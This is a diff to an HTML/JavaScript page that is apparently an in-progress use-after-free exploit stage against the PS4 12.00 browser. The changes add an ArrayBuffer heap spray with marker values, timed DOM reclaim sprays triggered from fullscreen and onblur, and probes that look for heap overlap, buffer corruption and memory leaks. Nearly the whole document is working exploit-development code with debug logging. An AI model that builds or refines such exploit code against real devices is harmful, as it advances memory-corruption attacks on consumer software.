@@ -1,13 +1,12 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Stage: Leak + Overlap</title>
+<title>PS4 12.00 - UAF Heap Overlap Stage</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Leak Stage</h2>
+<h2>UAF → ArrayBuffer Overlap</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -31,7 +30,6 @@ function setupHeap(){
         t[0]=i;
         arr.push(t);
     }
-    return arr;
 }
 
 // ==========================
@@ -59,14 +57,13 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 🔥 RECLAIM CONTROLADO + MARKERS
+// 💣 RECLAIM CONTROLADO
 // ==========================
 function preciseReclaim(size){
     log("[*] Reclaim size = "+size);
 
     let bucket=[];
 
-    // churn
     for(let i=0;i<3000;i++){
         let el=document.createElement("div");
         document.body.appendChild(el);
@@ -77,17 +74,13 @@ function preciseReclaim(size){
 
         let el;
 
-        // 90% controlado (mantém slot)
         if(i % 10 !== 0){
-
             el=document.createElement("div");
 
-            el.innerHTML=
+            el.innerHTML =
                 "<h1 style='margin-top:20%;text-align:center;'>CTRL_"+i+
                 "_41414141_42424242_43434343<br>Press OPTIONS</h1>";
-
         }
-        // 10% variação leve
         else{
             if(i % 20 === 0){
                 el=document.createElement("svg");
@@ -117,77 +110,122 @@ function preciseReclaim(size){
 }
 
 // ==========================
-// 🔬 LEAK + OVERLAP SCAN
+// 🔥 ARRAYBUFFER SPRAY
+// ==========================
+let buffers = [];
+
+function sprayArrayBuffers(count){
+
+    buffers = [];
+
+    for(let i=0;i<count;i++){
+
+        let buf = new ArrayBuffer(0x100);
+        let view = new Uint32Array(buf);
+
+        view[0] = 0x41414141;
+        view[1] = 0x42424242;
+        view[2] = 0x43434343;
+
+        buffers.push(view);
+    }
+
+    log("[*] ArrayBuffer spray: "+buffers.length);
+}
+
+// ==========================
+// 🔬 PROBE COMPLETO
 // ==========================
 function deepProbe(fsTarget){
 
-    log("---- DESYNC PROBE ----");
+    log("---- PROBE ----");
 
-    let html="";
-    let txt="";
-    let child=null;
-
+    // ======================
+    // DESYNC
+    // ======================
     try{
-        html = fsTarget.innerHTML;
+        let html = fsTarget.innerHTML;
+        let txt  = fsTarget.textContent;
+
         log("[CHECK] innerHTML = "+html);
-    }catch(e){
-        log("[ERR] innerHTML crash");
-    }
-
-    try{
-        txt = fsTarget.textContent;
         log("[CHECK] textContent = "+txt);
+
+        if(html !== txt){
+            log("[!!!] DESYNC DETECTADO");
+        }
+
     }catch(e){
-        log("[ERR] textContent crash");
+        log("[ERR] DOM read");
     }
 
+    // ======================
+    // CHILD
+    // ======================
     try{
-        child = fsTarget.firstChild;
-        log("[CHECK] firstChild = "+child);
-    }catch(e){
-        log("[ERR] child crash");
-    }
+        let child = fsTarget.firstChild;
 
-    // 🔥 DETECÇÃO DE DESSINCRONIZAÇÃO
-    if(html !== txt){
-        log("[!!!] DESYNC DETECTADO (innerHTML != textContent)");
-    }
+        log("[CHECK] child = "+child);
 
-    // 🔥 leitura profunda
-    try{
         if(child){
             let v = child.nodeValue || child.textContent;
             log("[LEAK?] child data = "+v);
 
             if(v && v.includes("41414141")){
-                log("[!!!] LEAK VIA CHILD");
+                log("[!!!] POSSIVEL LEAK VIA CHILD");
             }
         }
+
     }catch(e){
-        log("[LEAK] child crash");
+        log("[ERR] child crash");
     }
 
-    // 🔥 tentativa de coerção
+    // ======================
+    // WRITE TEST
+    // ======================
     try{
-        fsTarget.innerHTML = "<div id='x'>BBBBBBBB</div>";
-        log("[PWN] write innerHTML OK");
-    }catch(e){
-        log("[PWN] write crash");
-    }
+        fsTarget.innerHTML="<div>BBBBBBBB</div>";
+        log("[PWN] write OK");
 
-    // 🔥 re-leitura após write
-    try{
         let after = fsTarget.innerHTML;
         log("[CHECK] after write = "+after);
 
         if(!after.includes("BBBB")){
-            log("[!!!] WRITE DESYNC (grave)");
+            log("[!!!] WRITE DESYNC");
         }
+
     }catch(e){
-        log("[ERR] read after write");
+        log("[PWN] write crash");
     }
 
-    // estabilidade
+    // ======================
+    // ARRAYBUFFER CHECK
+    // ======================
+    try{
+
+        for(let i=0;i<buffers.length;i++){
+
+            let v = buffers[i];
+
+            if(v[0] !== 0x41414141){
+                log("[!!!] CORRUPÇÃO DETECTADA buffer "+i);
+                log("[VAL] "+v[0].toString(16));
+                break;
+            }
+
+            if(v[3] !== 0){
+                log("[!!!] POSSIVEL LEAK REAL");
+                log("[VAL3] "+v[3].toString(16));
+                break;
+            }
+        }
+
+    }catch(e){
+        log("[CRASH] buffer read");
+    }
+
+    // ======================
+    // ESTABILIDADE
+    // ======================
     try{
         log("[CHECK] parent = "+fsTarget.parentNode);
     }catch(e){}
@@ -199,6 +237,7 @@ function deepProbe(fsTarget){
         log("[UAF] rect crash");
     }
 }
+
 // ==========================
 // TRIGGER
 // ==========================
@@ -213,21 +252,20 @@ function trigger(fsTarget){
             document.webkitExitFullscreen?.();
         }
 
-    }catch(e){
-        log("[ERRO]");
-    }
+    }catch(e){}
 
-    let sizes=[1800,2000,2200,2500];
+    // 🔥 FASE 1 — spray heap real
+    setTimeout(()=>sprayArrayBuffers(2000), 0);
 
-    sizes.forEach((s,i)=>{
-        setTimeout(()=>preciseReclaim(s),i*60);
-    });
+    // 🔥 FASE 2 — reclaim DOM
+    setTimeout(()=>preciseReclaim(2000), 20);
+    setTimeout(()=>preciseReclaim(2200), 60);
+    setTimeout(()=>preciseReclaim(2500), 100);
 
-    // probes
-    setTimeout(()=>deepProbe(fsTarget),20);
-    setTimeout(()=>deepProbe(fsTarget),80);
-    setTimeout(()=>deepProbe(fsTarget),140);
-    setTimeout(()=>deepProbe(fsTarget),220);
+    // 🔬 probes
+    setTimeout(()=>deepProbe(fsTarget), 30);
+    setTimeout(()=>deepProbe(fsTarget), 90);
+    setTimeout(()=>deepProbe(fsTarget), 160);
 
     // dump
     setTimeout(()=>{
@@ -246,9 +284,9 @@ function runTest(){
 
     setupHeap();
 
-    let fsTarget=setupFullscreen();
+    let fsTarget = setupFullscreen();
 
-    window.onblur=function(){
+    window.onblur = function(){
         log("[*] onblur");
         setTimeout(()=>trigger(fsTarget),3000);
     };
